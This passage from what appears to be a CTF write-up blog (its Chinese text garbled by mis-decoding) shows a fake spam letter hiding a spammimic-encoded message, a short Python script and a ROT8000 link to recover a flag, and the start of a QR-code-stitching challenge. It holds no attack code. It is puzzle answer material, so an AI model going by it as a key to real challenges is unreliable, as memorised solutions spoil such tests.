class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs txt">    Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests ! This mail is being sent in compliance<br>with Senate bill 1620 ; Title 3 ; Section 308 ! This<br>is not a get rich scheme ! Why work for somebody else<br>when you can become rich in 27 MONTHS . Have you ever<br>noticed more people than ever are surfing the web and<br>more people than ever are surfing the web . Well, now<br>is your chance to capitalize on this ! WE will help<br>YOU use credit cards on your website plus turn your<br>business into an E-BUSINESS . You are guaranteed to<br>succeed because we take all the risk ! But don&#x27;t believe<br>us . Ms Simpson who resides in Maine tried us and says<br>&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;<br>. We are a BBB member in good standing ! We urge you<br>to contact us today for your own future financial well-being<br>. Sign up a friend and you&#x27;ll get a discount of 50%<br>. Thank-you for your serious consideration of our offer<br>! Dear Friend ; This letter was specially selected<br>to be sent to you ! We will comply with all removal<br>requests . This mail is being sent in compliance with<br>Senate bill 2316 ; Title 8 , Section 301 ! Do NOT confuse<br>us with Internet scam artists . Why work for somebody<br>else when you can become rich as few as 24 WEEKS !<br>Have you ever noticed more people than ever are surfing<br>the web plus how many people you know are on the Internet<br>. Well, now is your chance to capitalize on this .<br>We will help you decrease perceived waiting time by<br>200% and turn your business into an E-BUSINESS . You<br>are guaranteed to succeed because we take all the risk<br>. But don&#x27;t believe us . Mrs Simpson of Illinois tried<br>us and says &quot;Now I&#x27;m rich many more things are possible&quot;<br>! We assure you that we operate within all applicable<br>laws ! Do not delay - order today . Sign up a friend<br>and your friend will be rich too . Warmest regards<br>! Dear Sir or Madam ; Especially for you - this hot<br>information . We will comply with all removal requests<br>! This mail is being sent in compliance with Senate<br>bill 1916 ; Title 2 , Section 301 ! THIS IS NOT MULTI-LEVEL<br>MARKETING ! Why work for somebody else when you can<br>become rich in 89 days . Have you ever noticed most<br>everyone has a cellphone plus most everyone has a cellphone<br>! Well, now is your chance to capitalize on this !<br>WE will help YOU sell more &amp; SELL MORE . You can begin<br>at absolutely no cost to you . But don&#x27;t believe us<br>. Mr Jones of Minnesota tried us and says &quot;I was skeptical<br>but it worked for me&quot; ! We assure you that we operate<br>within all applicable laws ! We beseech you - act now<br>. Sign up a friend and you&#x27;ll get a discount of 90%<br>. Thanks . Dear Cybercitizen ; Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail ! This mail is being sent<br>in compliance with Senate bill 2016 , Title 2 , Section<br>304 . This is different than anything else you&#x27;ve seen<br>! Why work for somebody else when you can become rich<br>in 48 weeks ! Have you ever noticed more people than<br>ever are surfing the web plus people love convenience<br>! Well, now is your chance to capitalize on this .<br>WE will help YOU deliver goods right to the customer&#x27;s<br>doorstep &amp; turn your business into an E-BUSINESS .<br>You can begin at absolutely no cost to you . But don&#x27;t<br>believe us . Ms Anderson who resides in New York tried<br>us and says &quot;My only problem now is where to park all<br>my cars&quot; ! We are a BBB member in good standing . If<br>not for you then for your LOVED ONES - act now ! Sign<br>up a friend and you&#x27;ll get a discount of 20% ! God<br>Bless . Dear Colleague , Your email address has been<br>submitted to us indicating your interest in our publication<br>. If you no longer wish to receive our publications<br>simply reply with a Subject: of &quot;REMOVE&quot; and you will<br>immediately be removed from our mailing list . This<br>mail is being sent in compliance with Senate bill 2416<br>, Title 9 ; Section 308 ! This is NOT unsolicited bulk<br>mail . Why work for somebody else when you can become<br>rich within 24 MONTHS ! Have you ever noticed most<br>everyone has a cellphone and people love convenience<br>. Well, now is your chance to capitalize on this !<br>We will help you decrease perceived waiting time by<br>190% and sell more ! The best thing about our system<br>is that it is absolutely risk free for you ! But don&#x27;t<br>believe us . Mrs Anderson of Indiana tried us and says<br>&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal<br>. So make yourself rich now by ordering immediately<br>. Sign up a friend and your friend will be rich too<br>. God Bless ! Dear Colleague ; We know you are interested<br>in receiving amazing information ! If you are not interested<br>in our publications and wish to be removed from our<br>lists, simply do NOT respond and ignore this mail !<br>This mail is being sent in compliance with Senate bill<br>1619 , Title 7 , Section 303 ! This is not multi-level<br>marketing . Why work for somebody else when you can<br>become rich within 37 days ! Have you ever noticed<br>nobody is getting any younger plus people love convenience<br>! Well, now is your chance to capitalize on this .<br>WE will help YOU decrease perceived waiting time by<br>140% plus deliver goods right to the customer&#x27;s doorstep<br>. You can begin at absolutely no cost to you . But<br>don&#x27;t believe us ! Mrs Simpson of Illinois tried us<br>and says &quot;I was skeptical but it worked for me&quot; . We<br>are licensed to operate in all states ! Because the<br>Internet operates on &quot;Internet time&quot; you must make<br>a commitment soon ! Sign up a friend and you get half<br>off ! Thank-you for your serious consideration of our<br>offer . Dear Friend ; We know you are interested in<br>receiving amazing info ! We will comply with all removal<br>requests . This mail is being sent in compliance with<br>Senate bill 2716 , Title 5 , Section 303 ! This is<br>not a get rich scheme . Why work for somebody else<br>when you can become rich within 52 days ! Have you<br>ever noticed how many people you know are on the Internet<br>and the baby boomers are more demanding than their<br>parents ! Well, now is your chance to capitalize on<br>this . WE will help YOU decrease perceived waiting<br>time by 170% and turn your business into an E-BUSINESS<br>. You are guaranteed to succeed because we take all<br>the risk ! But don&#x27;t believe us ! Mrs Anderson who<br>resides in Alabama tried us and says &quot;Now I&#x27;m rich,<br>Rich, RICH&quot; ! We are a BBB member in good standing<br>. So make yourself rich now by ordering immediately<br>! Sign up a friend and you get half off ! Thanks .<br>Dear Salaryman ; Especially for you - this red-hot<br>news ! We will comply with all removal requests . This<br>mail is being sent in compliance with Senate bill 1618<br>, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING<br>. Why work for somebody else when you can become rich<br>inside 27 days ! Have you ever noticed nearly every<br>commercial on television has a .com on in it &amp; nearly<br>every commercial on television has a .com on in it<br>! Well, now is your chance to capitalize on this !<br>WE will help YOU decrease perceived waiting time by<br>180% plus turn your business into an E-BUSINESS . You<br>can begin at absolutely no cost to you ! But don&#x27;t<br>believe us ! Prof Ames who resides in Washington tried<br>us and says &quot;I was skeptical but it worked for me&quot;<br>. We assure you that we operate within all applicable<br>laws ! We implore you - act now . Sign up a friend<br>and you&#x27;ll get a discount of 10% . Thank-you for your<br>serious consideration of our offer ! Dear Friend ;<br>This letter was specially selected to be sent to you<br>! If you no longer wish to receive our publications<br>simply reply with a Subject: of &quot;REMOVE&quot; and you will<br>immediately be removed from our club ! This mail is<br>being sent in compliance with Senate bill 1622 , Title<br>7 ; Section 303 ! Do NOT confuse us with Internet scam<br>artists . Why work for somebody else when you can become<br>rich in 10 weeks ! Have you ever noticed people will<br>do almost anything to avoid mailing their bills &amp; people<br>love convenience ! Well, now is your chance to capitalize<br>on this . WE will help YOU turn your business into<br>an E-BUSINESS &amp; SELL MORE . You can begin at absolutely<br>no cost to you ! But don&#x27;t believe us . Mr Ames of<br>Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;<br>. We are licensed to operate in all states . We BESEECH<br>you - act now . Sign up a friend and you&#x27;ll get a discount<br>of 50% ! Thank-you for your serious consideration of<br>our offer .<br></code></pre></td></tr></table></figure></details><p>çœ¼ç†Ÿ</p><p>ä½¿ç”¨<a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a>è§£å¯†</p><p>å¾—åˆ° <code>ç±±ç±°ç±ªç±¶ç±®ç²„ç°¹ç±´ç±¨ç²‚ç±¸ç±¾ç±¨ç±¼ç°¹ç±µç±¿ç±®ç±¨ç±ªç±µç°ºç±¨ç±½ç±±ç°¼ç±¨ç±¼ç±®ç±¬ç±»ç°¼ç±½ç²†</code></p><p>å¤§ä½¬ç»™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br>s = <span class="hljs-string">&quot;ç±±ç±°ç±ªç±¶ç±®ç²„ç°¹ç±´ç±¨ç²‚ç±¸ç±¾ç±¨ç±¼ç°¹ç±µç±¿ç±®ç±¨ç±ªç±µç°ºç±¨ç±½ç±±ç°¼ç±¨ç±¼ç±®ç±¬ç±»ç°¼ç±½ç²†&quot;</span><br>poss = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">bytes</span>([i]).decode().isprintable():<br>        poss += <span class="hljs-built_in">bytes</span>([i]).decode()<br>flag = <span class="hljs-string">&quot;h&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s) - <span class="hljs-number">1</span>):<br>    tmp = bytes_to_long(s[i + <span class="hljs-number">1</span>].encode()) - bytes_to_long(s[i].encode())<br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-comment"># print(tmp+flag[i])</span><br>    flag += poss[(tmp + poss.find(flag[i])) % <span class="hljs-number">96</span>]<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p>or</p><p><a href="https://www.dcode.fr/rot8000-cipher">ROT8000 Cipher - Online Decoder, Encoder, Solver, Translator (dcode.fr)</a></p><p><img src="/posts/feba5816/image-20240222004305418.png" alt="image-20240222004305418"></p><h2 id="é¾™ä¹‹èˆ"><a href="#é¾™ä¹‹èˆ" class="headerlink" title="é¾™ä¹‹èˆ"></a>é¾™ä¹‹èˆ</h2><p>ä¹‹å‰é‡åˆ°è¿‡</p><p>æ‹¼æ¥äºŒç»´ç </p><p><img src="data:image/png;base64,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